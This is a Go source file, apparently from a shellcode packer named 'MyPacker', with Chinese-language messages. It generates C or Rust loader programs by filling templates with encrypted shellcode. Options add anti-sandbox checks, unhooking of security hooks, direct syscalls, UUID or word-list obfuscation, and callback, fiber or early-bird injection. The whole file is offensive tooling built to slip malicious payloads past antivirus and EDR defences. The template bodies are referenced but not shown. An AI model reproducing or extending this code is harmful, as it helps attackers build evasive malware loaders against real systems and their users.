package Loader

import (
	"MyPacker/Converters"
	"MyPacker/Others"
	"fmt"
	"os"
	"path/filepath"
	"strings"
)

func GenerateAndWriteTemplateToFile(options *Others.FlagOptions, EncryptShellcode string, uuidString string, words string, datasetString string) string {
	var file_extension = ""
	switch options.Language {
	case "c":
		file_extension = options.OutFile + ".c"
	case "rust":
		file_extension = "main.rs"
	default:
		println("选择语言错误\n")
		os.Exit(1)
	}
	fmt.Println("[+] 正在为您生成模板文件: " + file_extension + "\n")
	outfile := options.OutFile
	EncryptShellcode = Converters.FormattedHexShellcode(EncryptShellcode)
	switch strings.ToLower(options.Language) {
	case "c":
		dir, _ := os.Getwd()
		outfile = outfile + ".c"
		dir1 := filepath.Join(dir, "C_Template", outfile)
		switch options.Unhook {
		case false:
			//判断反沙箱
			switch options.Sandbox {
			case true:
				__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_ANTI_SANDBOX", __c__sandbox)
			default:
				__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_ANTI_SANDBOX", "")
			}
			//目标架构
			switch options.Framework {
			case 64:
				__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_STSYSCALL_Framework", "#include \"sys_64.h\"")
			case 32:
				__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_STSYSCALL_Framework", "#include \"sys_32.h\"")
			}

			switch strings.ToLower(options.Obfuscation) {
			case "uuid":
				__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACR_OBFUSCATION", __c__uuid)
				__c__syscall = fmt.Sprintf(__c__syscall, uuidString)
				switch strings.ToLower(options.Loading) {
				case "callback":
					//生成模板
					__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_Loading_Technique", __c__syscall_callback)
				case "fiber":
					__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_Loading_Technique", __c__syscall__fiber)
				case "earlybird":
					__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
				}
				//写文件
				Others.SaveTemplateToFile(dir1, __c__syscall)
			case "words":
				__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACR_OBFUSCATION", __c__words)
				__c__syscall = fmt.Sprintf(__c__syscall, datasetString, words)
				switch strings.ToLower(options.Loading) {
				case "callback":
					//生成模板
					__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_Loading_Technique", __c__syscall_callback)
				case "fiber":
					__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_Loading_Technique", __c__syscall__fiber)
				case "earlybird":
					__c__syscall = strings.ReplaceAll(__c__syscall, "REPLACE_Loading_Technique", __c__syscall__earlyBird)
				}
				//写文件
				Others.SaveTemplateToFile(dir1, __c__syscall)
			}
		case true:
			switch options.Sandbox {
			case true:
				__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_ANTI_SANDBOX", __c__sandbox)
			default:
				__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_ANTI_SANDBOX", "")
			}
			switch strings.ToLower(options.Obfuscation) {
			case "uuid":
				__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACR_OBFUSCATION", __c__uuid)
				__c__unhook = fmt.Sprintf(__c__unhook, uuidString)
				switch strings.ToLower(options.Loading) {
				case "callback":
					//生成模板
					__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_Loading_Technique", __c__unhook_callback)
				case "fiber":
					__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_Loading_Technique", __c__unhook__fiber)
				case "earlybird":
					__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_Loading_Technique", __c__unhook__earlyBird)
				}
				//写文件
				Others.SaveTemplateToFile(dir1, __c__unhook)
			case "words":
				__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACR_OBFUSCATION", __c__words)
				__c__unhook = fmt.Sprintf(__c__unhook, datasetString, words)
				switch strings.ToLower(options.Loading) {
				case "callback":
					//生成模板
					__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_Loading_Technique", __c__unhook_callback)
				case "fiber":
					__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_Loading_Technique", __c__unhook__fiber)
				case "earlybird":
					__c__unhook = strings.ReplaceAll(__c__unhook, "REPLACE_Loading_Technique", __c__unhook__earlyBird)
				}
				//写文件
				Others.SaveTemplateToFile(dir1, __c__unhook)
			}
		}
	case "rust":
		dir, _ := os.Getwd()
		dir1 := filepath.Join(dir, "Rust_Template", "src", "main.rs")
		outfile = outfile + ".rs"
		switch options.Unhook {
		case true:
			switch options.Sandbox {
			case true:
				__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_ANTI_SANDBOX", __rust__sandbox)
			default:
				__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_ANTI_SANDBOX", "")
			}
			switch strings.ToLower(options.Obfuscation) {
			case "uuid":
				__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACR_OBFUSCATION", __rust__uuid)
				__rust__unhook = fmt.Sprintf(__rust__unhook, uuidString, datasetString, words)
				switch strings.ToLower(options.Loading) {
				case "callback":
					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__callback)
				case "fiber":
					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__fiber)
				case "earlybird":
					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__earlybird)
				}
				Others.SaveTemplateToFile(dir1, __rust__unhook)
			case "words":
				__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACR_OBFUSCATION", __rust__words)
				__rust__unhook = fmt.Sprintf(__rust__unhook, datasetString, words)
				switch strings.ToLower(options.Loading) {
				case "callback":
					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__callback)
				case "fiber":
					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__fiber)
				case "earlybird":
					__rust__unhook = strings.ReplaceAll(__rust__unhook, "REPLACE_Loading_Technique", __rust__unhook__earlybird)
				}
				Others.SaveTemplateToFile(dir1, __rust__unhook)
			}

		case false:
			fmt.Println("暂不支持此种加载方式")
			os.Exit(-1)
		}
	}
	return outfile
}
